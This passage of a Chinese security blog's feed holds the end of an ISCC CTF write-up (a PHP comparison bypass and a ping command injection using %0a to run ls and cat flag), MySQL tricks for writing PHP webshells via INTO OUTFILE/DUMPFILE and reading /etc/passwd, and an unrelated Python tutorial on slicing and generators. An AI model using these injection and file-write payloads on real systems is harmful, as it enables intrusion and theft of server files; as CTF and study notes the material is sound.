class="string">'password'</span>] &gt; <span class="number">999</span>)&#123;</div><div class="line">$b = g;</div><div class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;very good!Password is right&lt;/p&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span> </div><div class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too little&lt;/p&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too long&lt;/p&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password is not numeric&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> ($a.$b == <span class="string">"flag"</span>)</div><div class="line"><span class="keyword">print</span> $flag;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>分析一下，username还是用的strcmp判断的，然后password要求长度<4且数值>999，所以payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.190.152.202:8017/?username[]=&apos;admin&apos;&amp;password=9e9</div></pre></td></tr></table></figure></4且数值></p><p><img src="/2018/07/01/ISCC-writeup/1525696215252.png" alt="Alt text"></p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>开始完全不知道该怎么做，还是太菜了呀，py过后</p><p>在get方式下命令执行，过滤| 使用%0a绕过</p><p>查看当前目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als</a></p><p>查看源代码<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"> &apos;&apos;,</div><div class="line">&apos;;&apos; =&gt; &apos;&apos;,</div><div class="line">&apos;|&apos; =&gt; &apos;&apos;,</div><div class="line">&apos;-&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;$&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;(&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;)&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;`&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;||&apos; =&gt; &apos;&apos;,</div><div class="line">);</div><div class="line"></div><div class="line"></div><div class="line">$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</div><div class="line">    </div><div class="line"></div><div class="line"></div><div class="line">if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123;</div><div class="line">// Windows</div><div class="line"></div><div class="line">$cmd = shell_exec( &apos;ping  &apos; . $target );</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">// *nix</div><div class="line">$cmd = shell_exec( &apos;ping  -c 1 &apos; . $target );</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">echo  &quot;</div><div class="line">&#123;$cmd&#125;</div><div class="line">&quot;;</div><div class="line"></div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>查看根目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080036_137.png" alt=""></p><p>一个一个试查看flag在哪里 发现flag在/home/flag</p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080045_61.png" alt=""></p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag</a></p><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ISCC-WP&quot;&gt;&lt;a href=&quot;#ISCC-WP&quot; class=&quot;headerlink&quot; title=&quot;ISCC WP&quot;&gt;&lt;/a&gt;ISCC WP&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Mysql写入文件小技巧</title>
    <link href="https://www.twosmi1e.com/2018/02/10/Mysql%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>https://www.twosmi1e.com/2018/02/10/Mysql写入文件小技巧/</id>
    <published>2018-02-10T15:03:01.000Z</published>
    <updated>2018-03-13T11:36:57.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-用UNION写入"><a href="#1-用UNION写入" class="headerlink" title="1.用UNION写入"></a>1.用UNION写入</h1><p>&nbsp;&nbsp;<a href="http://url/?id=1" target="_blank" rel="external">http://url/?id=1</a> and 0 union select 1,2 ,’&lt;?php phpinfo(); ?&gt;’ into dumpfile ‘文件绝对路径’<br><img src="http://t1.aixinxi.net/o_1c8fibdp316ln1hegq27nnvmeua.png-j.jpg" alt=""><br>&nbsp;&nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，<br>但是如果用来写bat,mof,vbs等文件就会出问题了，那么怎么去掉这个只写入我们需要的内容呢？采用hex编码就好了。<br><img src="http://t1.aixinxi.net/o_1c8fibvrb1ddf1l1p2ti16q4hu8a.png-j.jpg" alt=""><br>&nbsp;&nbsp;将我们要写入的内容使用hex编码在分段写在每个字段位上，这样就可以只写入我们需要的内容了。</p><h1 id="2-不支持union注入时-用terminated-by"><a href="#2-不支持union注入时-用terminated-by" class="headerlink" title="2.不支持union注入时 用terminated by"></a>2.不支持union注入时 用terminated by</h1><p>&nbsp;&nbsp;语法：select <em> from admin where id=1 into outfile ‘F:\WWW\phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23<br><img src="http://t1.aixinxi.net/o_1c7bt8hbmc5ev2a1tvt1gvh12jga.png-j.jpg" alt=""><br>&nbsp;&nbsp;可以看到成功写入，但是这个方法有一个弊病就是查询出来的数据必须大于或等于2以上才可以写入内容，写入的内容数=查询出来的数据-1<br>可以看到，当我们使前面的数据出错查不到数据的时候，写入是失败的。<br>看看sqlmap中的情况：<br><img src="http://t1.aixinxi.net/o_1c7btan3lvrq1f89ntd1n0562na.png-j.jpg" alt=""><br>&nbsp;&nbsp;可以很明显的看到sqlmap中也有这种办法写入。（burp抓取sqlmap数据包：加上 –proxy “<a href="http://127.0.0.1:8080/" target="_blank" rel="external">http://127.0.0.1:8080/</a>“; 在burp里可以看到请求）<br><img src="http://t1.aixinxi.net/o_1c7btd46a1k5rfab1bpee9u1asoa.png-j.jpg" alt=""><br>当然可以看到也通过了常规的union写入文件。<br>同时附上一个函数exp()。通过这个函数也可以读取文件，但是写文件只能写入一个内容为0的文件，这里就必须结合其他的漏洞利用了，如：文件覆盖之类的。<br>读文件：<br>select exp(~(select</em>from(select load_file(‘/etc/passwd’))a));<br>写文件：<br>select exp(~(select*from(select ‘hello’)a)) into outfile ‘C:/out.txt’;  //但是只能写一个0进去。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-用UNION写入&quot;&gt;&lt;a href=&quot;#1-用UNION写入&quot; class=&quot;headerlink&quot; title=&quot;1.用UNION写入&quot;&gt;&lt;/a&gt;1.用UNION写入&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;http://url/?id=1&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python高级特性</title>
    <link href="https://www.twosmi1e.com/2018/02/02/Python%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/"/>
    <id>https://www.twosmi1e.com/2018/02/02/Python高级特性/</id>
    <published>2018-02-02T13:11:53.000Z</published>
    <updated>2018-04-24T08:12:37.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h1><p>取list或者tuple的部分元素<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L = [<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>, <span class="string">'Bob'</span>, <span class="string">'Jack'</span>]</div></pre></td></tr></table></figure></p><p>取前3个元素，应该怎么做？笨办法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;[L[<span class="number">0</span>], L[<span class="number">1</span>], L[<span class="number">2</span>]]</div><div class="line">[<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>]</div></pre></td></tr></table></figure></p><p>取前3个元素，用一行代码就可以完成切片：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[<span class="number">0</span>:<span class="number">3</span>]</div><div class="line">[<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>]</div></pre></td></tr></table></figure></p><p>L[0:3]表示，从索引0开始取，直到索引3为止，但不包括索引3。即索引0，1，2，正好是3个元素。<br>如果第一个索引是0，还可以省略：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[:<span class="number">3</span>]</div><div class="line">[<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>]</div></pre></td></tr></table></figure></p><p>类似的，既然Python支持L[-1]取倒数第一个元素，那么它同样支持倒数切片，试试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[<span class="number">-2</span>:][<span class="string">'Bob'</span>, <span class="string">'Jack'</span>]</div><div class="line">&gt;&gt;&gt;L[<span class="number">-2</span>:<span class="number">-1</span>][<span class="string">'Bob'</span>]</div></pre></td></tr></table></figure></p><p>记住倒数第一个元素的索引是-1。</p><p>切片操作十分有用。我们先创建一个0-99的数列：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L = list(range(<span class="number">100</span>))</div><div class="line">&gt;&gt;&gt;L</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, ..., <span class="number">99</span>]</div></pre></td></tr></table></figure></p><p>可以通过切片轻松取出某一段数列。比如前10个数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[:<span class="number">10</span>]</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</div></pre></td></tr></table></figure></p><p>后10个数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[<span class="number">-10</span>:]</div></pre></td></tr></table></figure></p><p>前11-20个数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[<span class="number">10</span>:<span class="number">20</span>]</div><div class="line">[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>]</div></pre></td></tr></table></figure></p><p>前10个数，每两个取一个：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[:<span class="number">10</span>:<span class="number">2</span>]</div><div class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</div></pre></td></tr></table></figure></p><p>所有数，每5个取一个：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[::<span class="number">5</span>]</div><div class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">75</span>, <span class="number">80</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">95</span>]</div></pre></td></tr></table></figure></p><p>甚至什么都不写，只写[:]就可以原样复制一个list：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[:]</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, ..., <span class="number">99</span>]</div></pre></td></tr></table></figure></p><p>tuple也是一种list，唯一区别是tuple不可变。因此，tuple也可以用切片操作，只是操作的结果仍是tuple：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)[:<span class="number">3</span>]</div><div class="line">(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>)</div></pre></td></tr></table></figure></p><p>字符串’xxx’也可以看成是一种list，每个元素就是一个字符。因此，字符串也可以用切片操作，只是操作结果仍是字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="string">'ABCDEFG'</span>[:<span class="number">3</span>]</div><div class="line"><span class="string">'ABC'</span></div><div class="line">&gt;&gt;&gt;<span class="string">'ABCDEFG'</span>[::<span class="number">2</span>]</div><div class="line"><span class="string">'ACEG'</span></div></pre></td></tr></table></figure></p><h1 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h1><p>如果给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。<br>list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;d = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>, <span class="string">'c'</span>: <span class="number">3</span>&#125;</div><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> key <span class="keyword">in</span> d:</div><div class="line"><span class="meta">... </span>    print(key)</div><div class="line">...</div><div class="line">a</div><div class="line">c</div><div class="line">b</div></pre></td></tr></table></figure></p><p>默认情况：dict迭代key<br><strong>for value in d.values()</strong>  迭代value<br><strong>for k, v in d.items()</strong>  同时迭代key和value<br>由于字符串也是可迭代对象，因此，也可以作用于for循环：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">'ABC'</span>:</div><div class="line"><span class="meta">... </span>    print(ch)</div><div class="line">...</div><div class="line">A</div><div class="line">B</div><div class="line">C</div></pre></td></tr></table></figure></p><p>只要作用于一个可迭代对象，for循环就可以正常运行，而我们不太关心该对象究竟是list还是其他数据类型。<br>通过collections模块的lterable类型判断<br>函数isinstance<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sinstance(<span class="string">'abc'</span>, Iterable) <span class="comment"># str是否可迭代</span></div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;isinstance([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], Iterable) <span class="comment"># list是否可迭代</span></div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;isinstance(<span class="number">123</span>, Iterable) <span class="comment"># 整数是否可迭代</span></div><div class="line"><span class="keyword">False</span></div></pre></td></tr></table></figure></p><p>如果要对list实现类似Java那样的下标循环怎么办？Python内置的enumerate函数可以把一个list变成索引-元素对，这样就可以在for循环中同时迭代索引和元素本身：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate([<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>]):</div><div class="line"><span class="meta">... </span>    print(i, value)</div><div class="line">...</div><div class="line"><span class="number">0</span> A</div><div class="line"><span class="number">1</span> B</div><div class="line"><span class="number">2</span> C</div></pre></td></tr></table></figure></p><p>上面的for循环里，同时引用了两个变量，在Python里是很常见的，比如下面的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> x, y <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">9</span>)]:</div><div class="line"><span class="meta">... </span>    print(x, y)</div><div class="line">...</div><div class="line"><span class="number">1</span> <span class="number">12</span> <span class="number">43</span> <span class="number">9</span></div></pre></td></tr></table></figure></p><h1 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h1><p>List Comprehensions可以用来创建list的生成式<br>生成的元素 for in 范围 if 条件判断<br>要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用list(range(1, 11))：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;list(range(<span class="number">1</span>, <span class="number">11</span>))</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</div></pre></td></tr></table></figure></p><p>但如果要生成[1x1, 2x2, 3x3, …, 10x10]怎么做？方法一是循环：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L = []</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">or</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>):</div><div class="line"><span class="meta">... </span>   L.append(x * x)</div><div class="line">...</div><div class="line">&gt;&gt;&gt;L</div><div class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</div></pre></td></tr></table></figure></p><p>但是循环太繁琐，而列表生成式则可以用一行语句代替循环生成上面的list：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;[x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>)]</div><div class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</div></pre></td></tr></table></figure></p><p>写列表生成式时，把要生成的元素x * x放到前面，后面跟for循环，就可以把list创建出来，十分有用，多写几次，很快就可以熟悉这种语法。<br>for循环后面还可以加上if判断，这样我们就可以筛选出仅偶数的平方：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;[x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</div><div class="line">[<span class="number">4</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">100</span>]</div></pre></td></tr></table></figure></p><p>还可以使用两层循环，可以生成全排列：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;[m + n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">'ABC'</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">'XYZ'</span>]</div><div class="line">[<span class="string">'AX'</span>, <span class="string">'AY'</span>, <span class="string">'AZ'</span>, <span class="string">'BX'</span>, <span class="string">'BY'</span>, <span class="string">'BZ'</span>, <span class="string">'CX'</span>, <span class="string">'CY'</span>, <span class="string">'CZ'</span>]</div></pre></td></tr></table></figure></p><p>for循环可以同时使用两个甚至多个变量， 比如dict的items（）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;d = &#123;<span class="string">'x'</span>: <span class="string">'A'</span>, <span class="string">'y'</span>: <span class="string">'B'</span>, <span class="string">'z'</span>: <span class="string">'C'</span> &#125;</div><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> k, v <span class="keyword">in</span> d.items():</div><div class="line"><span class="meta">... </span>    print(k, <span class="string">'='</span>, v)</div><div class="line">...</div><div class="line">y = B</div><div class="line">x = A</div><div class="line">z = C</div></pre></td></tr></table></figure></p><p>同时迭代key和value<br>源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">L1 = [<span class="string">'Hello'</span>, <span class="string">'World'</span>, <span class="number">18</span>, <span class="string">'Apple'</span>, <span class="keyword">None</span>]</div><div class="line">L2 = [s.lower() <span class="keyword">for</span> s <span class="keyword">in</span> L1 <span class="keyword">if</span> isinstance(s, str)]</div><div class="line"><span class="keyword">print</span> (L2)</div></pre></td></tr></table></figure></p><h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><p>generator:生成器 一边循环一边计算<br>要创建一个generator，有很多种方法。第一种方法很简单，只要把一个列表生成式的[]改成()，就创建了一个generator：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</div><div class="line">&gt;&gt;&gt;L</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</div><div class="line">&gt;&gt;&gt;g = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</div><div class="line">&gt;&gt;&gt;g</div><div class="line">&lt;generator object &lt;genexpr&gt; at <span class="number">0x1022ef630</span>&gt;</div></pre></td></tr></table></figure></p><p>创建L和g的区别仅在于最外层的[]和()，L是一个list，而g是一个generator。<br>通过next()函数获得generator的下一个返回值<br>没有更多的元素时抛出StopIteration的错误<br>要把fib函数变成generator，只需要把print(b)改为yield b就可以了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(max)</span>:</span></div><div class="line">n, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></div><div class="line"><span class="keyword">while</span> n &lt; max:</div><div class="line"><span class="keyword">yield</span> b</div><div class="line">a, b = b, a + b</div><div class="line">n = n + <span class="number">1</span></div><div class="line"><span class="keyword">return</span> <span class="string">'done'</span></div></pre></td></tr></table></figure></p><p>#测试<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">f = fib(<span class="number">10</span>)</div><div class="line">print(<span class="string">'fib(10):'</span>, f)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> f:</div><div class="line">print(x)</div></pre></td></tr></table></figure></p><p>如果一个函数定义中包含yield关键字，则这为generator<br>generator和函数的执行流程不一样。函数是顺序执行，遇到return语句或者最后一行函数语句就返回。而变成generator的函数，在每次调用next()的时候执行，遇到yield语句返回，再次执行时从上次返回的yield语句处继续执行。</p><p>我们在循环过程中不断调用yield，就会不断中断。当然要给循环设置一个条件来退出循环，不然就会产生一个无限数列出来。<br>同样的，把函数改成generator后，我们基本上从来不会用next()来获取下一个返回值，而是直接使用for循环来迭代：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> n <span class="keyword">in</span> fib(<span class="number">6</span>):</div><div class="line"><span class="meta">... </span>    print(n)</div><div class="line">...</div></pre></td></tr></table></figure></p><p>但是用for循环调用generator时，发现拿不到generator的return语句的返回值。如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;while True:</div><div class="line">...     try:</div><div class="line">...         x = next(g)</div><div class="line">...         print(&apos;g:&apos;, x)</div><div class="line">...     except StopIteration as e:</div><div class="line">...         print(&apos;Generator return value:&apos;, e.value)</div><div class="line">...         break</div></pre></td></tr></table></figure></p><p>请注意区分普通函数和generator函数，普通函数调用直接返回结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;r = abs(<span class="number">6</span>)</div><div class="line">&gt;&gt;&gt;r</div><div class="line"><span class="number">6</span></div></pre></td></tr></table></figure></p><p>generator函数的“调用”实际返回一个generator对象：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;g = fib(<span class="number">6</span>)</div><div class="line">&gt;&gt;&gt;g</div><div class="line">&lt;generator object fib at <span class="number">0x1022ef948</span>&gt;</div></pre></td></tr></table></figure></p><p>练习输出杨辉三角  见yanghuireiangle</p><h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><p>可作用于for的数据类型，一类为集合数据类型，一类为generator<br>统称为可迭代对象：Iterable 用 isinstance ()判断<br><figure class="highlight 